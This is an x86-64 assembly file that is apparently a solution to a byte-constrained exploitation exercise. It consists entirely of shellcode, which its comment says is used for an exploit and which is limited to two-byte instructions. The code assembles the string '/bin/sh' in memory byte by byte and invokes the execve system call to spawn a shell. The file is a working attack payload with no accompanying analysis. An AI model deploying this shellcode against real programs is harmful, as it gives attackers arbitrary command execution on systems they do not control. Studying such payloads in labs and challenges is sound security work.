.intel_syntax noprefix
.global _start

# the shellcode used for the exploit. uses only instructions with at most 2 bytes.

_start:
push 0x00
push 0x68
push 0x73
push 0x2f
push 0x6e
push 0x69
push 0x62
push 0x2f

push rbx
pop rdi

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

xor esi, esi
xor edx, edx
push 59
pop rax
syscall

